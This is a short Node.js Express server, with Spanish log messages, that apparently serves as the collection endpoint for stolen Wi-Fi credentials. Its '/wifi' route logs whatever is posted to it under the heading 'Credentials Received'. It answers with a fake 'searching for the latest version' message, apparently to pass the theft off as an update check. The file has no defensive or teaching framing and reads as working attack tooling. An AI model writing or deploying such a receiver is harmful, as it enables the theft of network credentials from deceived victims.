// node server.js
const express = require('express');
const app = express();
const PORT = 3000;

app.use(express.text()); 

app.post('/wifi', (req, res) => {
    console.log("--- Credenciales Recibidas ---");
    console.log(req.body); 
    console.log("------------------------------");

    res.send("Buscando la versión más reciente...");
});

app.listen(PORT, () => {
    console.log(`Servidor escuchando en http://localhost:${PORT}`);
});
